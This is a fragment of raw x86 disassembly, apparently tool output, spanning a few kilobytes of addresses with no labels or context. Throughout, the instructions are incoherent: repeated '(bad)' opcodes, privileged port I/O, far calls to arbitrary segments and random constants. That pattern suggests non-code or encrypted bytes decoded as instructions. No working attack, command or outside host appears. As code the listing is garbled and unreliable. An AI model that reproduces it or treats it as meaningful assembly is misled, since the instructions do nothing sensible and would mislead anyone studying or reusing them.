  41eaef:	xor    DWORD PTR [ebx+0x58e9869a],ecx
  41eaf5:	xor    BYTE PTR [edi+0x7b],bh
  41eaf8:	in     eax,0x70
  41eafa:	or     dh,BYTE PTR [edi-0x80]
  41eafd:	stos   BYTE PTR es:[edi],al
  41eafe:	inc    edx
  41eaff:	sub    al,0xd0
  41eb01:	xor    DWORD PTR [esi+0x76bf0675],esp
  41eb07:	jl     0x41eae9
  41eb09:	hlt    
  41eb0a:	test   eax,0xc74576f0
  41eb0f:	test   al,0x33
  41eb11:	int3   
  41eb12:	stos   BYTE PTR es:[edi],al
  41eb13:	pop    ss
  41eb14:	cmp    ebp,DWORD PTR [esi+ebx*1]
  41eb17:	xor    eax,0x6a07cf33
  41eb1c:	outs   dx,DWORD PTR ds:[esi]
  41eb1d:	pushf  
  41eb1e:	xor    DWORD PTR [ebx+0xf],edx
  41eb21:	(bad)  
  41eb22:	dec    ebx
  41eb23:	je     0x41eafe
  41eb25:	adc    bl,ch
  41eb27:	add    BYTE PTR [ecx],dh
  41eb29:	sbb    BYTE PTR [ebx],cl
  41eb2b:	xchg   esi,eax
  41eb2c:	and    DWORD PTR [ecx+0x68],edx
  41eb2f:	ret    0x7dc
  41eb32:	fwait
  41eb33:	clc    
  41eb34:	aaa    
  41eb35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb36:	push   es
  41eb37:	cmp    eax,0x487aaf3b
  41eb3c:	inc    ecx
  41eb3d:	lock in eax,0x4e
  41eb40:	mov    ecx,0x9683d57
  41eb45:	mov    BYTE PTR [esi+0x4b406a75],ah
  41eb4b:	mov    eax,0xe945b818
  41eb50:	inc    esi
  41eb51:	or     eax,0x1b1dfe2
  41eb56:	inc    esi
  41eb57:	enter  0xbc1f,0x29
  41eb5b:	jle    0x41ebd3
  41eb5d:	mov    fs,WORD PTR [edi]
  41eb5f:	in     al,dx
  41eb60:	sub    ecx,esp
  41eb62:	cmp    ecx,edi
  41eb64:	adc    ch,BYTE PTR [ebx]
  41eb66:	inc    eax
  41eb67:	and    edx,DWORD PTR [ecx]
  41eb69:	cdq    
  41eb6a:	stos   DWORD PTR es:[edi],eax
  41eb6b:	adc    eax,0x62b9a01b
  41eb70:	lock and DWORD PTR [eax+0x13c5e523],eax
  41eb77:	pusha  
  41eb78:	jg     0x41eb96
  41eb7a:	inc    edi
  41eb7b:	shl    BYTE PTR [ebp+0x3ccab0cb],cl
  41eb81:	xor    cl,BYTE PTR [ecx+0x7f757bca]
  41eb87:	and    eax,0xe844303f
  41eb8c:	adc    dh,BYTE PTR [edx+0x2142def5]
  41eb92:	or     DWORD PTR [edi],ecx
  41eb94:	add    ch,cl
  41eb96:	pop    ss
  41eb97:	js     0x41ebbc
  41eb99:	adc    al,0xd
  41eb9b:	or     DWORD PTR [ebx+0x13],ecx
  41eb9e:	fsub   QWORD PTR [edx]
  41eba0:	push   0x26
  41eba2:	out    0x3a,eax
  41eba4:	in     eax,dx
  41eba5:	out    dx,eax
  41eba6:	mov    dl,0x61
  41eba8:	pop    edx
  41eba9:	leave  
  41ebaa:	outs   dx,DWORD PTR ds:[esi]
  41ebab:	jno    0x41ebe2
  41ebad:	xchg   esi,eax
  41ebae:	jb     0x41ebe8
  41ebb0:	xchg   esi,eax
  41ebb1:	loopne 0x41ebe2
  41ebb3:	test   BYTE PTR [esi],cl
  41ebb5:	push   edi
  41ebb6:	(bad)  
  41ebb7:	jbe    0x41ec1d
  41ebb9:	push   ebp
  41ebba:	xchg   edi,eax
  41ebbb:	pop    eax
  41ebbc:	daa    
  41ebbd:	jle    0x41eb48
  41ebbf:	or     DWORD PTR [edi-0x34],0xffffffe9
  41ebc3:	in     al,0x1c
  41ebc5:	inc    esi
  41ebc6:	(bad)  
  41ebc7:	movd   DWORD PTR [ecx],mm1
  41ebca:	mov    esp,0xdfbf7fae
  41ebcf:	add    al,dl
  41ebd1:	fsubrp st(0),st
  41ebd3:	(bad)  
  41ebd4:	call   0x6d86:0x1b2e3d20
  41ebdb:	jmp    0xd95e:0x1847167c
  41ebe2:	outs   dx,BYTE PTR ds:[esi]
  41ebe3:	or     al,0x61
  41ebe5:	fcmovnbe st,st(6)
  41ebe7:	xor    bh,BYTE PTR [edi+0x5b]
  41ebea:	and    cl,BYTE PTR [ecx+esi*4]
  41ebed:	sbb    DWORD PTR [edi],esi
  41ebef:	add    al,0x8a
  41ebf1:	les    esi,FWORD PTR [edx]
  41ebf3:	mov    ebx,0xa1cc242a
  41ebf8:	fisttp QWORD PTR [esi-0x4fe04472]
  41ebfe:	lods   al,BYTE PTR ds:[esi]
  41ebff:	sub    DWORD PTR [ebx+ecx*8],edi
  41ec02:	push   esi
  41ec03:	jo     0x41eba8
  41ec05:	in     al,dx
  41ec06:	ins    DWORD PTR es:[edi],dx
  41ec07:	das    
  41ec08:	inc    eax
  41ec09:	fdiv   DWORD PTR [ebx]
  41ec0b:	arpl   WORD PTR [ecx-0x5b22e864],sp
  41ec11:	sub    al,0x49
  41ec13:	nop
  41ec14:	out    0x2d,eax
  41ec16:	push   eax
  41ec17:	and    DWORD PTR [ebx+ecx*4],0x87662304
  41ec1e:	pop    ebp
  41ec1f:	mov    cl,0xfd
  41ec21:	dec    edx
  41ec22:	hlt    
  41ec23:	dec    esp
  41ec24:	enter  0x9d57,0x67
  41ec28:	inc    ebx
  41ec29:	gs (bad) 
  41ec2b:	js     0x41ec5a
  41ec2d:	retf   
  41ec2e:	lds    esp,FWORD PTR [eax+0x4002933d]
  41ec34:	je     0x41ec1b
  41ec36:	cmp    al,0x68
  41ec38:	stos   BYTE PTR es:[edi],al
  41ec39:	inc    ebp
  41ec3a:	dec    edx
  41ec3b:	push   0xffffffef
  41ec3d:	imul   BYTE PTR [edx+0x1f]
  41ec40:	jp     0x41ec3a
  41ec42:	xor    DWORD PTR [eax+ebx*2-0x2f],0x8523ebb1
  41ec4a:	shl    DWORD PTR [ebx],cl
  41ec4c:	cwde   
  41ec4d:	call   FWORD PTR [eax-0xf]
  41ec50:	(bad)  
  41ec51:	je     0x41ec0d
  41ec53:	ins    DWORD PTR es:[edi],dx
  41ec54:	dec    esi
  41ec55:	rep ins BYTE PTR es:[edi],dx
  41ec57:	imul   edx,DWORD PTR ds:0xa28db098,0x2555aa25
  41ec61:	jl     0x41ecc9
  41ec63:	inc    esi
  41ec64:	loopne 0x41ec01
  41ec66:	push   ecx
  41ec67:	cmp    esp,ebx
  41ec69:	xor    BYTE PTR [eax+0x17485b49],bh
  41ec6f:	xor    bl,al
  41ec71:	addr16 leave 
  41ec73:	rol    BYTE PTR ds:0xa6cc73a2,cl
  41ec79:	ret    
  41ec7a:	dec    eax
  41ec7b:	or     eax,0xaa2b3fe0
  41ec80:	int    0xf9
  41ec82:	cwde   
  41ec83:	rcl    DWORD PTR [edx],cl
  41ec85:	mov    ds:0xa4193173,al
  41ec8a:	in     al,dx
  41ec8b:	adc    al,0x9c
  41ec8d:	dec    esi
  41ec8e:	rcl    BYTE PTR [ebp+edi*1-0x56],0xef
  41ec93:	or     eax,0x1ced5c70
  41ec98:	inc    esp
  41ec99:	jbe    0x41ec33
  41ec9b:	cdq    
  41ec9c:	loop   0x41ec6d
  41ec9e:	add    ebx,DWORD PTR [ebx]
  41eca0:	mov    WORD PTR [esi-0x5a7b9444],cs
  41eca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca7:	stos   DWORD PTR es:[edi],eax
  41eca8:	and    al,0xcb
  41ecaa:	inc    esp
  41ecab:	fs sub ch,cl
  41ecae:	shr    DWORD PTR [ecx],0xe7
  41ecb1:	push   0x5a751a40
  41ecb6:	or     esi,DWORD PTR [ecx+0x36]
  41ecb9:	pushf  
  41ecba:	mov    edx,0x1c2ff3b3
  41ecbf:	dec    esi
  41ecc0:	daa    
  41ecc1:	jge    0x41ed3a
  41ecc3:	or     eax,0xfc9991e9
  41ecc8:	mov    BYTE PTR [ecx-0x12f4d9ad],cl
  41ecce:	clc    
  41eccf:	xor    BYTE PTR [edi],0x7f
  41ecd2:	xor    ecx,DWORD PTR [eax-0x693fa346]
  41ecd8:	in     eax,0x4d
  41ecda:	fadd   QWORD PTR [esi]
  41ecdc:	push   ebp
  41ecdd:	xchg   esi,eax
  41ecde:	es or  ebx,esp
  41ece1:	call   0x7464:0xc38237c7
  41ece8:	in     al,0x4a
  41ecea:	jae    0x41ed4d
  41ecec:	(bad)  
  41ecee:	xchg   ecx,eax
  41ecef:	enter  0x9b20,0xa5
  41ecf3:	inc    eax
  41ecf4:	push   ebp
  41ecf5:	mov    eax,ds:0x1fed0a69
  41ecfa:	and    eax,0x52b3596b
  41ecff:	xchg   ebp,eax
  41ed00:	pop    ebp
  41ed01:	hlt    
  41ed02:	mov    eax,ds:0xb5a3020a
  41ed07:	or     DWORD PTR [ebp-0x10f24027],edx
  41ed0d:	(bad)  
  41ed0e:	out    dx,eax
  41ed0f:	push   ebp
  41ed10:	xchg   esp,eax
  41ed11:	fnstsw WORD PTR [ecx-0x66]
  41ed14:	pop    edx
  41ed15:	ds dec esi
  41ed17:	jmp    0x41ec9c
  41ed19:	repnz lods al,BYTE PTR ds:[esi]
  41ed1b:	mov    dl,0xbd
  41ed1d:	sbb    al,0xf8
  41ed1f:	cwde   
  41ed20:	mov    dl,0x5c
  41ed22:	push   ecx
  41ed23:	dec    ecx
  41ed24:	repz mov ss,WORD PTR [ebp-0x3c]
  41ed28:	cli    
  41ed29:	sub    BYTE PTR [edi-0x1],al
  41ed2c:	out    dx,eax
  41ed2d:	iretw  
  41ed2f:	fcomp  QWORD PTR [eax-0x5b]
  41ed32:	pushf  
  41ed33:	mov    edi,0xc69ac0c8
  41ed38:	pop    ds
  41ed39:	js     0x41ed16
  41ed3b:	or     DWORD PTR [ebx+0x42],edx
  41ed3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed3f:	inc    edi
  41ed40:	loopne 0x41ed2b
  41ed42:	cmp    esp,DWORD PTR [ecx-0x2c]
  41ed45:	(bad)  
  41ed46:	fimul  WORD PTR [edi-0x712483ee]
  41ed4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed4d:	adc    al,0xb8
  41ed4f:	outs   dx,BYTE PTR ds:[esi]
  41ed50:	inc    eax
  41ed51:	xchg   esp,eax
  41ed52:	push   ebx
  41ed53:	adc    BYTE PTR [edx],dh
  41ed55:	aas    
  41ed56:	repz xchg ecx,eax
  41ed58:	popf   
  41ed59:	push   ss
  41ed5a:	rol    DWORD PTR gs:[edi+eiz*4+0x5c],cl
  41ed5f:	stos   BYTE PTR es:[edi],al
  41ed60:	lea    ecx,[edx]
  41ed62:	lahf   
  41ed63:	and    bh,BYTE PTR [ebx]
  41ed65:	pop    esi
  41ed66:	sub    BYTE PTR [edi-0x6d],al
  41ed69:	push   eax
  41ed6a:	xor    al,0xac
  41ed6c:	push   ebp
  41ed6d:	push   edx
  41ed6e:	stos   BYTE PTR es:[edi],al
  41ed6f:	mov    edx,DWORD PTR [edx]
  41ed71:	loop   0x41ed43
  41ed73:	sbb    ah,bl
  41ed75:	push   0x65
  41ed77:	ja     0x41edc8
  41ed79:	das    
  41ed7a:	push   edx
  41ed7b:	lods   al,BYTE PTR ds:[si]
  41ed7d:	jae    0x41edfb
  41ed7f:	cmp    al,0xd0
  41ed81:	xor    dl,BYTE PTR [ebp+0x3a389a9d]
  41ed87:	dec    esi
  41ed88:	lahf   
  41ed89:	cdq    
  41ed8a:	fidivr DWORD PTR [edx+0x4d057c31]
  41ed90:	jns    0x41ee11
  41ed92:	dec    ecx
  41ed93:	mov    eax,0xb805f065
  41ed98:	daa    
  41ed99:	pop    ebp
  41ed9a:	fcmovbe st,st(2)
  41ed9c:	cmp    al,al
  41ed9e:	push   ebx
  41ed9f:	(bad)  
  41eda0:	dec    ebp
  41eda1:	mov    ebp,0xe6e0c505
  41eda6:	gs cdq 
  41eda8:	mov    ch,0xd5
  41edaa:	xor    BYTE PTR [edx+0x7a3ce8c9],0x4a
  41edb1:	jae    0x41edcf
  41edb3:	dec    esi
  41edb4:	loopne 0x41eda9
  41edb6:	in     al,dx
  41edb7:	pop    ecx
  41edb8:	jns    0x41eddf
  41edba:	add    al,0xb3
  41edbc:	push   ds
  41edbd:	std    
  41edbe:	lea    eax,[edi+ebp*8+0x3c64eb69]
  41edc5:	push   edx
  41edc6:	imul   esp,DWORD PTR [ecx],0xffffff9c
  41edc9:	push   cs
  41edca:	cmp    esp,DWORD PTR [bx-0x7b]
  41edce:	jns    0x41ed69
  41edd0:	clc    
  41edd1:	mov    DWORD PTR [ecx+0x198e228f],ebp
  41edd7:	or     BYTE PTR [ebp+0x42],cl
  41edda:	jbe    0x41edcc
  41eddc:	jne    0x41ed7f
  41edde:	and    ax,0x198b
  41ede2:	scas   al,BYTE PTR es:[edi]
  41ede3:	pop    esp
  41ede4:	(bad)  
  41ede5:	scas   al,BYTE PTR es:[edi]
  41ede6:	sub    eax,0x8eb7163c
  41edeb:	enter  0x19a2,0x2f
  41edef:	mov    dl,0xe2
  41edf1:	daa    
  41edf2:	icebp  
  41edf3:	retf   
  41edf4:	dec    esi
  41edf5:	push   es
  41edf6:	push   ds
  41edf7:	aas    
  41edf8:	addr16 pop eax
  41edfa:	mov    al,0x48
  41edfc:	aaa    
  41edfd:	lahf   
  41edfe:	out    0xbc,al
  41ee00:	inc    eax
  41ee01:	mov    ah,0x3b
  41ee03:	rol    bh,cl
  41ee05:	mov    esi,0xda31925e
  41ee0a:	fld    st(1)
  41ee0c:	jmp    0xb224d59d
  41ee11:	addr16 push 0xd36b18c7
  41ee17:	jnp    0x41ee35
  41ee19:	pop    es
  41ee1a:	sahf   
  41ee1b:	scas   eax,DWORD PTR es:[edi]
  41ee1c:	fwait
  41ee1d:	add    DWORD PTR [edi-0x4d7af418],esi
  41ee23:	aad    0x79
  41ee25:	dec    edx
  41ee26:	xchg   edi,eax
  41ee27:	cmp    DWORD PTR [edx+0x58],esi
  41ee2a:	outs   dx,DWORD PTR ds:[esi]
  41ee2b:	jnp    0x41ee09
  41ee2d:	call   0x9de8:0xbb4ad37b
  41ee34:	xchg   esp,eax
  41ee35:	cmp    ah,BYTE PTR [ebx]
  41ee37:	fisttp QWORD PTR fs:[edx+0x72]
  41ee3b:	outs   dx,DWORD PTR ds:[esi]
  41ee3c:	xlat   BYTE PTR ds:[ebx]
  41ee3d:	jg     0x41ee82
  41ee3f:	aaa    
  41ee40:	mov    ah,0x2b
  41ee42:	adc    eax,0xf0525366
  41ee47:	cld    
  41ee48:	jno    0x41edff
  41ee4a:	mov    esp,0x73e52d86
  41ee4f:	out    dx,eax
  41ee50:	cmc    
  41ee51:	inc    ebp
  41ee52:	cmp    BYTE PTR [ebp+0x5be5a41c],al
  41ee58:	xchg   edx,eax
  41ee59:	mov    bl,0x80
  41ee5b:	push   esi
  41ee5c:	sbb    DWORD PTR [edx+ecx*4],ebp
  41ee5f:	mov    gs:0xa9237bc6,al
  41ee65:	cmc    
  41ee66:	std    
  41ee67:	adc    al,0xb2
  41ee69:	push   cs
  41ee6a:	jb     0x41ee1b
  41ee6c:	out    dx,al
  41ee6d:	fwait
  41ee6e:	mov    dh,0x10
  41ee70:	pop    esp
  41ee71:	(bad)
  41ee74:	stc    
  41ee75:	cdq    
  41ee76:	jmp    0x41edff
  41ee78:	in     eax,dx
  41ee79:	in     al,0x27
  41ee7b:	pop    eax
  41ee7c:	ror    edx,0x90
  41ee7f:	int    0x58
  41ee81:	(bad)  
  41ee82:	add    eax,0xc6fa9a8e
  41ee87:	sbb    BYTE PTR ds:0xeb6b7cbd,bh
  41ee8d:	jb     0x41ee86
  41ee8f:	xchg   esp,eax
  41ee90:	xor    BYTE PTR [ebx+0x62],bl
  41ee93:	dec    esi
  41ee94:	daa    
  41ee95:	lock jne 0x41ee35
  41ee98:	hlt    
  41ee99:	xor    BYTE PTR [esi-0x54],ch
  41ee9c:	(bad)  
  41ee9d:	iret   
  41ee9e:	dec    esp
  41ee9f:	xchg   ch,bh
  41eea1:	jg     0x41ee3c
  41eea3:	pusha  
  41eea4:	retf   0x2236
  41eea7:	in     eax,dx
  41eea8:	adc    eax,0x1a024f73
  41eead:	loope  0x41eef5
  41eeaf:	rol    DWORD PTR [ebx+0x7916c840],1
  41eeb5:	dec    eax
  41eeb6:	pop    edx
  41eeb7:	popf   
  41eeb8:	sti    
  41eeb9:	pop    esi
  41eeba:	(bad)  
  41eebb:	push   eax
  41eebc:	outs   dx,BYTE PTR ds:[esi]
  41eebd:	jbe    0x41eebc
  41eebf:	push   ds
  41eec0:	push   eax
  41eec1:	and    al,0xa9
  41eec3:	out    dx,al
  41eec4:	out    0xcd,al
  41eec6:	(bad)  
  41eec7:	cmp    dl,ah
  41eec9:	push   ebp
  41eeca:	xchg   esp,eax
  41eecb:	push   cs
  41eecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eecd:	dec    esp
  41eece:	mov    ecx,0x29481f0
  41eed3:	sbb    eax,0x414d652d
  41eed8:	mov    ebp,0xfaced218
  41eedd:	mov    al,ds:0x57a23dd1
  41eee2:	inc    eax
  41eee3:	ret    
  41eee4:	int    0xd
  41eee6:	leave  
  41eee7:	xchg   DWORD PTR [edx],esi
  41eee9:	dec    ebx
  41eeea:	fwait
  41eeeb:	pushf  
  41eeec:	adc    al,0xba
  41eeee:	nop
  41eeef:	mov    dh,0xd
  41eef1:	test   eax,0xa6276920
  41eef6:	mov    bh,0x45
  41eef8:	mov    bl,BYTE PTR [edx]
  41eefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eefb:	jns    0x41eef2
  41eefd:	push   ebp
  41eefe:	push   ds
  41eeff:	shl    DWORD PTR [esi],cl
  41ef01:	stos   DWORD PTR es:[edi],eax
  41ef02:	test   al,0x73
  41ef04:	dec    esp
  41ef05:	mov    bl,0xf
  41ef07:	shl    edi,0xb3
  41ef0a:	mov    eax,0xf316d8a4
  41ef0f:	mov    dl,0xec
  41ef11:	cmp    DWORD PTR [edi-0x20e3e487],esp
  41ef17:	nop
  41ef18:	loop   0x41ef35
  41ef1a:	jecxz  0x41ef65
  41ef1c:	arpl   WORD PTR [ebx],sp
  41ef1e:	repz mov ebp,0x94f6e1d0
  41ef24:	das    
  41ef25:	jmp    0x41efa4
  41ef27:	call   0x4345:0x190636dd
  41ef2e:	(bad)  
  41ef2f:	sbb    eax,0xc501d0bc
  41ef34:	adc    al,0xbf
  41ef36:	lods   al,BYTE PTR ds:[esi]
  41ef37:	cs push es
  41ef39:	stos   DWORD PTR es:[edi],eax
  41ef3a:	push   edi
  41ef3b:	mov    ecx,0x40bf34d9
  41ef40:	jnp    0x41ef65
  41ef42:	push   ebp
  41ef43:	xor    DWORD PTR [esi+eiz*8-0x5e],ebx
  41ef47:	dec    BYTE PTR [eax+0x7fa46834]
  41ef4d:	pop    ecx
  41ef4e:	stos   DWORD PTR es:[edi],eax
  41ef4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef50:	dec    ebp
  41ef51:	daa    
  41ef52:	sbb    bl,BYTE PTR [ebx-0x12d2127a]
  41ef58:	dec    eax
  41ef59:	adc    cl,al
  41ef5b:	adc    eax,0xa27909a3
  41ef60:	aas    
  41ef61:	adc    bh,cl
  41ef63:	push   es
  41ef64:	xchg   edx,eax
  41ef65:	dec    ecx
  41ef66:	xlat   BYTE PTR ds:[ebx]
  41ef67:	daa    
  41ef68:	ss inc edx
  41ef6a:	std    
  41ef6b:	imul   ebp,DWORD PTR [edi+0x73],0x30
  41ef6f:	ss jp  0x41ef57
  41ef72:	arpl   di,sp
  41ef74:	clc    
  41ef75:	xchg   edx,eax
  41ef76:	ja     0x41ef7f
  41ef78:	pop    esp
  41ef79:	lds    esp,FWORD PTR [edx+0x33223113]
  41ef7f:	in     eax,dx
  41ef80:	pmullw mm6,QWORD PTR [edx+0x74]
  41ef84:	pop    ecx
  41ef85:	into   
  41ef86:	test   al,0x31
  41ef88:	inc    esp
  41ef89:	or     edi,ebp
  41ef8b:	mov    DWORD PTR [edx-0x31beeb23],edx
  41ef91:	(bad)
  41ef94:	out    0x3e,eax
  41ef96:	jecxz  0x41efc2
  41ef98:	cli    
  41ef99:	xchg   esp,eax
  41ef9a:	fst    st(5)
  41ef9c:	xchg   DWORD PTR [ecx-0x7c6bf22a],ebp
  41efa2:	mov    ds:0xa909f692,eax
  41efa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa8:	into   
  41efa9:	out    dx,al
  41efaa:	xchg   edi,eax
  41efab:	jne    0x41f011
  41efad:	dec    ebp
  41efae:	jns    0x41ef68
  41efb0:	out    dx,al
  41efb1:	mov    ds:0x80004012,eax
  41efb6:	stos   DWORD PTR es:[edi],eax
  41efb7:	sub    DWORD PTR [ecx-0x142c911],eax
  41efbd:	aaa    
  41efbe:	sbb    eax,0x3cdc271a
  41efc3:	cmp    eax,0xd813b61d
  41efc8:	or     dh,bh
  41efca:	inc    edi
  41efcb:	inc    edi
  41efcc:	out    dx,al
  41efcd:	sbb    eax,0x84a8a094
  41efd2:	adc    eax,0x782d0683
  41efd7:	in     eax,dx
  41efd8:	lods   eax,DWORD PTR ds:[esi]
  41efd9:	push   ss
  41efda:	out    dx,eax
  41efdb:	pop    edx
  41efdc:	pop    es
  41efdd:	inc    ebp
  41efde:	jae    0x41ef91
  41efe0:	cli    
  41efe1:	add    dh,BYTE PTR [edi+0x30]
  41efe4:	mov    eax,ds:0x15510de1
  41efe9:	pop    esi
  41efea:	mov    esi,0x65a0d3f7
  41efef:	loopne 0x41f061
  41eff1:	popa   
  41eff2:	add    ebx,DWORD PTR [ecx+edi*4-0x35716e91]
  41eff9:	xchg   DWORD PTR [edx-0x4148cbf2],ebp
  41efff:	idiv   BYTE PTR [eax-0x3061dad]
  41f005:	xchg   ebx,eax
  41f006:	mov    bl,BYTE PTR [ecx-0xd]
  41f009:	push   0xde1c0fb7
  41f00e:	cwde   
  41f00f:	cmp    esp,esi
  41f011:	shl    bh,cl
  41f013:	sbb    BYTE PTR [ebp+0x30fedea2],bh
  41f019:	sbb    BYTE PTR [ebx-0x43730194],dl
  41f01f:	push   eax
  41f020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f021:	jg     0x41f084
  41f023:	xchg   ecx,eax
  41f024:	and    eax,0xa5eff018
  41f029:	scas   eax,DWORD PTR es:[edi]
  41f02a:	add    bh,BYTE PTR [ebx-0x4]
  41f02d:	or     al,BYTE PTR [esi+0x4adfec0d]
  41f033:	sti    
  41f034:	(bad)  
  41f035:	mov    ebx,0x55ba84a7
  41f03a:	xlat   BYTE PTR ds:[ebx]
  41f03b:	into   
  41f03c:	call   0x87eb:0x63ab325c
  41f043:	lods   eax,DWORD PTR ds:[esi]
  41f044:	repz xchg ecx,eax
  41f046:	inc    ebp
  41f047:	dec    esp
  41f048:	jg     0x41efcb
  41f04a:	jg     0x41f0a5
  41f04c:	scas   eax,DWORD PTR es:[edi]
  41f04d:	pop    edi
  41f04e:	in     eax,dx
  41f04f:	push   ecx
  41f050:	mov    ch,dh
  41f052:	add    DWORD PTR [eax],eax
  41f054:	or     al,0xed
  41f056:	test   DWORD PTR [esp-0x276dd808],eax
  41f05d:	jecxz  0x41f0d7
  41f05f:	add    DWORD PTR [esi],edx
  41f061:	stos   DWORD PTR es:[edi],eax
  41f062:	imul   ebp,DWORD PTR [esi+0x45],0x56
  41f066:	cld    
  41f067:	sbb    ebp,DWORD PTR [esi-0x38]
  41f06a:	push   ss
  41f06b:	push   0xfffffff8
  41f06d:	add    dh,BYTE PTR [ecx]
  41f06f:	lods   eax,DWORD PTR ds:[esi]
  41f070:	fisttp DWORD PTR [edx-0x56]
  41f073:	pop    esi
  41f074:	jb     0x41f04c
  41f076:	fnstcw WORD PTR [ebx+0x60]
  41f079:	sub    ecx,ebp
  41f07b:	lods   eax,DWORD PTR ds:[esi]
  41f07c:	dec    esi
  41f07d:	xchg   DWORD PTR [esi],ebp
  41f07f:	sub    BYTE PTR [eax],0xde
  41f082:	cli    
  41f083:	lods   al,BYTE PTR ds:[esi]
  41f084:	mov    edx,0xffd40b09
  41f089:	dec    esi
  41f08a:	inc    edi
  41f08b:	mov    ecx,0xd87b7b5
  41f090:	mov    ebp,0xc7d5365a
  41f095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f096:	sub    edx,DWORD PTR [ecx-0x186fd8cb]
  41f09c:	clc    
  41f09d:	arpl   WORD PTR [ebp+0x4],di
  41f0a0:	add    BYTE PTR [eax],al
  41f0a2:	add    BYTE PTR [eax],al
  41f0a4:	add    BYTE PTR [eax],al
  41f0a6:	xor    eax,esp
  41f0a8:	loope  0x41f063
  41f0aa:	icebp  
  41f0ab:	mov    ecx,0xab3fe879
  41f0b0:	in     al,0x3
  41f0b2:	mov    eax,0x6b4f2ccc
  41f0b7:	jmp    0x763f0bd
  41f0bc:	add    BYTE PTR [eax],al
  41f0be:	sub    al,0xed
  41f0c0:	aaa    
  41f0c1:	cli    
  41f0c2:	in     al,0xa8
  41f0c4:	std    
  41f0c5:	rol    esi,cl
  41f0c7:	mov    ebx,ebx
  41f0c9:	or     ah,bl
  41f0cb:	js     0x41f112
  41f0cd:	or     al,0xdb
  41f0cf:	mov    bh,0xf9
  41f0d1:	jns    0x41f0c8
  41f0d3:	outs   dx,BYTE PTR ds:[esi]
  41f0d4:	shl    DWORD PTR [eax-0x72ce9ae],0xeb
  41f0db:	mov    dh,0xd1
  41f0dd:	inc    edx
  41f0de:	imul   edi,DWORD PTR fs:[ebx-0x15bee0cc],0x2b
  41f0e6:	add    DWORD PTR [ebx],0x6fb20493
  41f0ec:	xchg   esi,eax
  41f0ed:	je     0x41f0e1
  41f0ef:	xchg   ebx,eax
  41f0f0:	sub    al,0xf6
  41f0f2:	inc    ebp
  41f0f3:	push   cs
  41f0f4:	and    DWORD PTR [edi],esi
  41f0f6:	xor    eax,0x74e143d3
  41f0fb:	dec    edx
  41f0fc:	(bad)  
  41f0fd:	rcr    BYTE PTR [ecx],0x40
  41f100:	in     eax,0x7d
  41f102:	enter  0x7506,0xee
  41f106:	sub    cl,bh
  41f108:	and    edi,edx
  41f10a:	leave  
  41f10b:	ins    BYTE PTR es:[edi],dx
  41f10c:	loop   0x41f0e2
  41f10e:	fistp  WORD PTR [esi-0x19]
  41f111:	fs pop esp
  41f113:	mov    bl,0x8f
  41f115:	shl    DWORD PTR [bp+0x1a],1
  41f119:	add    al,0x81
  41f11b:	pop    ds
  41f11c:	push   ebp
  41f11d:	jbe    0x41f19c
  41f11f:	or     esi,DWORD PTR [eax]
  41f121:	adc    dl,BYTE PTR [ecx]
  41f123:	into   
  41f124:	add    eax,0x2a20d9a6
  41f129:	dec    ecx
  41f12a:	mov    WORD PTR [edx-0x290f62d6],?
  41f130:	sub    dl,al
  41f132:	cmp    DWORD PTR [eax-0x6b44ba30],0xffffffc0
  41f139:	push   0xffffff94
  41f13b:	or     esp,DWORD PTR ds:0x8df9bfd6
  41f141:	add    DWORD PTR [edi+0xa],eax
  41f144:	add    DWORD PTR [edi+0x7b],ebp
  41f147:	jl     0x41f0e7
  41f149:	dec    ecx
  41f14a:	fdivr  QWORD PTR [ebx-0x80]
  41f14d:	jp     0x41f15c
  41f14f:	(bad)  [eax+ecx*1]
  41f152:	pop    ds
  41f153:	push   eax
  41f154:	in     al,dx
  41f155:	lahf   
  41f156:	add    esp,DWORD PTR [ebx]
  41f158:	test   cl,ch
  41f15a:	ficomp DWORD PTR [edx]
  41f15c:	xor    edx,DWORD PTR [eax]
  41f15e:	ss out dx,al
  41f160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f161:	dec    eax
  41f162:	leave  
  41f163:	and    esi,edx
  41f165:	dec    esp
  41f166:	mov    esp,0x6c44b15a
  41f16b:	pop    es
  41f16c:	xor    cl,BYTE PTR [edi-0x5]
  41f16f:	outs   dx,BYTE PTR ds:[esi]
  41f170:	jne    0x41f1e6
  41f172:	dec    ecx
  41f173:	push   ebx
  41f174:	xchg   esi,eax
  41f175:	inc    edx
  41f176:	mov    cl,0xdb
  41f178:	nop
  41f179:	inc    eax
  41f17a:	shl    DWORD PTR [edi],0xe9
  41f17d:	js     0x41f125
  41f17f:	pusha  
  41f180:	hlt    
  41f181:	cmp    edi,eax
  41f183:	cli    
  41f184:	enter  0xc48a,0x33
  41f188:	in     al,dx
  41f189:	mov    DWORD PTR [eax+0x3f],ebx
  41f18c:	jp     0x41f1bf
  41f18e:	add    esp,esi
  41f190:	das    
  41f191:	and    al,0x2
  41f193:	js     0x41f1c9
  41f195:	and    DWORD PTR [ebx+ebx*2],esi
  41f198:	fnsave [ecx+0x56]
  41f19b:	push   edx
  41f19c:	pusha  
  41f19d:	xor    eax,0x63307b20
  41f1a2:	jecxz  0x41f170
  41f1a4:	or     bh,BYTE PTR [edx-0x58]
  41f1a7:	pop    DWORD PTR [edi]
  41f1a9:	loopne 0x41f213
  41f1ab:	adc    DWORD PTR [esi+0x3],edx
  41f1ae:	and    al,0x2d
  41f1b0:	mov    eax,ds:0x6fe1918b
  41f1b5:	pop    esi
  41f1b6:	push   edx
  41f1b7:	(bad)  [edi-0x3f]
  41f1ba:	sub    eax,0x3934e2e4
  41f1bf:	jge    0x41f191
  41f1c1:	lods   al,BYTE PTR ds:[esi]
  41f1c2:	add    al,0x6e
  41f1c4:	fidivr DWORD PTR [esi]
  41f1c6:	out    dx,al
  41f1c7:	dec    ecx
  41f1c8:	mov    al,0xd7
  41f1ca:	scas   eax,DWORD PTR es:[edi]
  41f1cb:	add    al,0x0
  41f1cd:	xor    al,al
